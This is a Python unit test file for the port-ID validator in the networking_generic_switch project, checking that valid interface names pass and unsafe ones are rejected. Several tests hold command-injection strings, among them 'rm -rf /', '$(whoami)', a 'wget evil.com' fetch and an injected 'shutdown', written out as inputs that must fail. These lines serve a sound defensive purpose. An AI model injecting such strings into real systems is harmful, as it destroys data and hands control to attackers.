# Copyright 2025 Red Hat, Inc.
#
#    Licensed under the Apache License, Version 2.0 (the "License"); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.

import unittest

from networking_generic_switch import exceptions
from networking_generic_switch import validation


class TestValidatePortId(unittest.TestCase):

    def test_valid_simple(self):
        self.assertEqual('Ethernet1/1',
                         validation.validate_port_id('Ethernet1/1'))

    def test_valid_juniper_style(self):
        self.assertEqual('xe-0/0/1:0',
                         validation.validate_port_id('xe-0/0/1:0'))

    def test_valid_subinterface(self):
        self.assertEqual('GigabitEthernet0/0.100',
                         validation.validate_port_id('GigabitEthernet0/0.100'))

    def test_valid_port_channel(self):
        self.assertEqual('Port-Channel1',
                         validation.validate_port_id('Port-Channel1'))

    def test_valid_with_spaces(self):
        self.assertEqual('Ethernet 1/1',
                         validation.validate_port_id('Ethernet 1/1'))

    def test_valid_at_max_spaces(self):
        port_id = 'a' + ' a' * validation.MAX_PORT_ID_SPACES
        self.assertEqual(port_id, validation.validate_port_id(port_id))

    def test_rejects_over_max_spaces(self):
        port_id = 'a' + ' a' * (validation.MAX_PORT_ID_SPACES + 1)
        self.assertRaises(exceptions.GenericSwitchInvalidPortId,
                          validation.validate_port_id,
                          port_id)

    def test_valid_underscore(self):
        self.assertEqual('eth_0',
                         validation.validate_port_id('eth_0'))

    def test_valid_integer_input(self):
        self.assertEqual('2222',
                         validation.validate_port_id(2222))

    def test_strips_leading_trailing_whitespace(self):
        self.assertEqual('Ethernet1/1',
                         validation.validate_port_id('  Ethernet1/1  '))

    def test_none_passthrough(self):
        self.assertIsNone(validation.validate_port_id(None))

    def test_empty_string_passthrough(self):
        self.assertEqual('', validation.validate_port_id(''))

    def test_whitespace_only(self):
        self.assertEqual('', validation.validate_port_id('   '))

    def test_valid_at_max_length(self):
        port_id = 'a' * validation.MAX_PORT_ID_LEN
        self.assertEqual(port_id, validation.validate_port_id(port_id))

    def test_rejects_over_max_length(self):
        self.assertRaises(
            exceptions.GenericSwitchInvalidPortId,
            validation.validate_port_id,
            'a' * (validation.MAX_PORT_ID_LEN + 1))

    def test_rejects_newline(self):
        self.assertRaises(exceptions.GenericSwitchInvalidPortId,
                          validation.validate_port_id,
                          'Ethernet1/1\nshutdown')

    def test_rejects_semicolon(self):
        self.assertRaises(exceptions.GenericSwitchInvalidPortId,
                          validation.validate_port_id,
                          'eth0; rm -rf /')

    def test_rejects_pipe(self):
        self.assertRaises(exceptions.GenericSwitchInvalidPortId,
                          validation.validate_port_id,
                          'eth0 | grep')

    def test_rejects_dollar(self):
        self.assertRaises(exceptions.GenericSwitchInvalidPortId,
                          validation.validate_port_id,
                          'eth0$(whoami)')

    def test_rejects_backtick(self):
        self.assertRaises(exceptions.GenericSwitchInvalidPortId,
                          validation.validate_port_id,
                          'eth0`id`')

    def test_rejects_ampersand(self):
        self.assertRaises(exceptions.GenericSwitchInvalidPortId,
                          validation.validate_port_id,
                          'eth0 && wget evil.com')

    def test_rejects_redirect(self):
        self.assertRaises(exceptions.GenericSwitchInvalidPortId,
                          validation.validate_port_id,
                          'eth0 > /dev/null')

    def test_rejects_bang(self):
        self.assertRaises(exceptions.GenericSwitchInvalidPortId,
                          validation.validate_port_id,
                          'eth0!')

    def test_rejects_hash(self):
        self.assertRaises(exceptions.GenericSwitchInvalidPortId,
                          validation.validate_port_id,
                          'eth0 #comment')

    def test_rejects_double_quote(self):
        self.assertRaises(exceptions.GenericSwitchInvalidPortId,
                          validation.validate_port_id,
                          'eth0"')

    def test_rejects_single_quote(self):
        self.assertRaises(exceptions.GenericSwitchInvalidPortId,
                          validation.validate_port_id,
                          "eth0'")

    def test_rejects_backslash(self):
        self.assertRaises(exceptions.GenericSwitchInvalidPortId,
                          validation.validate_port_id,
                          'eth0\\n')

    def test_rejects_curly_braces(self):
        self.assertRaises(exceptions.GenericSwitchInvalidPortId,
                          validation.validate_port_id,
                          'eth{0}')

    def test_rejects_parentheses(self):
        self.assertRaises(exceptions.GenericSwitchInvalidPortId,
                          validation.validate_port_id,
                          'eth(0)')

    def test_rejects_square_brackets(self):
        self.assertRaises(exceptions.GenericSwitchInvalidPortId,
                          validation.validate_port_id,
                          'eth[0]')

    def test_rejects_question_mark(self):
        self.assertRaises(exceptions.GenericSwitchInvalidPortId,
                          validation.validate_port_id,
                          'eth0?')

    def test_rejects_asterisk(self):
        self.assertRaises(exceptions.GenericSwitchInvalidPortId,
                          validation.validate_port_id,
                          'eth0*')

    def test_rejects_tilde(self):
        self.assertRaises(exceptions.GenericSwitchInvalidPortId,
                          validation.validate_port_id,
                          '~eth0')

    def test_rejects_ctrl_z(self):
        self.assertRaises(exceptions.GenericSwitchInvalidPortId,
                          validation.validate_port_id,
                          'eth0\x1a')

    def test_rejects_ctrl_c(self):
        self.assertRaises(exceptions.GenericSwitchInvalidPortId,
                          validation.validate_port_id,
                          'eth0\x03')

    def test_rejects_null_byte(self):
        self.assertRaises(exceptions.GenericSwitchInvalidPortId,
                          validation.validate_port_id,
                          'eth0\x00')

    def test_rejects_carriage_return(self):
        self.assertRaises(exceptions.GenericSwitchInvalidPortId,
                          validation.validate_port_id,
                          'eth0\rshutdown')
